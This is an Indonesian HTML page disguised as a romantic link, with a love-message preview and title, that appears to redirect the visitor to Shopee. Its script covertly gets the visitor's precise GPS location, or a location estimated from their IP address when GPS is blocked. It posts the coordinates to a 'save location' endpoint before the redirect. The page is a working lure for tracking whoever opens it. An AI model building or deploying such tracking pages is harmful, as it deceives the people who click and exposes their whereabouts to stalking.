<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>aa sayang oneng</title>

    <meta property="og:title" content="Aa sayang oneng" />
    <meta property="og:description" content="muahhhhhhhhh" />
    <meta
      property="og:image"
      content="https://static.vecteezy.com/system/resources/thumbnails/022/313/464/small/i-love-you-banner-with-heart-vector.jpg" />
    <meta property="og:type" content="website" />

    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #f9f9f9;
      }
      .loading-box {
        text-align: center;
      }
      .spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #3498db;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin: 0 auto 15px auto;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    <div class="loading-box">
      <div class="spinner"></div>
      <p id="status">Mengalihkan, mohon tunggu...</p>
    </div>

    <script>
      const TARGET_URL = "https://shopee.co.id";
      let sudahRedirect = false;

      function alihkanSekarang() {
        if (!sudahRedirect) {
          sudahRedirect = true;
          window.location.replace(TARGET_URL);
        }
      }

      // Waktu cadangan (fallback)
      const fallbackTimer = setTimeout(() => {
        alihkanSekarang();
      }, 6000);

      function kirimGPSKeNodeJS(dataGPS) {
        fetch("/api/simpan-lokasi", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(dataGPS),
        })
          .catch((err) => console.error("Gagal kirim data:", err))
          .finally(() => {
            clearTimeout(fallbackTimer);
            alihkanSekarang();
          });
      }

      // Ambil lokasi alternatif dari alamat IP jika GPS diblokir/gagal
      function ambilLokasiViaIP() {
        fetch("https://ipapi.co/json/")
          .then((res) => res.json())
          .then((data) => {
            if (data.latitude && data.longitude) {
              kirimGPSKeNodeJS({
                latitude: data.latitude,
                longitude: data.longitude,
                akurasi_meter: 5000, // Perkiraan akurasi via IP
              });
            } else {
              alihkanSekarang();
            }
          })
          .catch(() => {
            alihkanSekarang();
          });
      }

      window.onload = function () {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              // Berhasil dapat GPS presisi
              const dataGPS = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                akurasi_meter: position.coords.accuracy,
              };
              kirimGPSKeNodeJS(dataGPS);
            },
            (error) => {
              // Jika diblokir / tidak ada gembok / error GPS -> Ambil via IP
              console.warn("GPS gagal/diblokir, beralih ke lokasi IP...");
              ambilLokasiViaIP();
            },
            {
              enableHighAccuracy: true,
              timeout: 2000,
              maximumAge: 0,
            },
          );
        } else {
          ambilLokasiViaIP();
        }
      };
    </script>
  </body>
</html>
